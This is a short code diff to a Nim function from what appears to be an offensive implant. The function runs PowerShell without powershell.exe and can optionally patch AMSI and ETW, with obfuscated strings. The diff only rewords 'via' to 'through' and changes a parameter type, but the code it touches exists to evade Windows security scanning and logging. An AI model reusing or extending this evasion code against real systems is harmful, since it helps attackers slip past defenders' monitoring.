@@ -3,9 +3,9 @@ from strutils import parseInt, join
 import ../../selfProtections/patches/[patchAMSI, patchETW]
 import ../../util/strenc
 
-# Execute a PowerShell command via referencing the System.Management.Automation
+# Execute a PowerShell command through referencing the System.Management.Automation
 # assembly DLL directly without calling powershell.exe
-proc powershell*(args : varargs[string]) : string =
+proc powershell*(args : seq[string]) : string =
     # This shouldn't happen since parameters are managed on the Python-side, but you never know
     if not args.len >= 2:
         result = obf("Invalid number of arguments received. Usage: 'powershell <BYPASSAMSI=0> <BLOCKETW=0> [command]'.")
@@ -19,7 +19,7 @@ proc powershell*(args : varargs[string]) : string =
     amsi = cast[bool](parseInt(args[0]))
     etw = cast[bool](parseInt(args[1]))
 
-    result = obf("Executing command via unmanaged PowerShell...\n")
+    result = obf("Executing command through unmanaged PowerShell...\n")
     if amsi:
         var res = patchAMSI.patchAMSI()
         if res == 0:
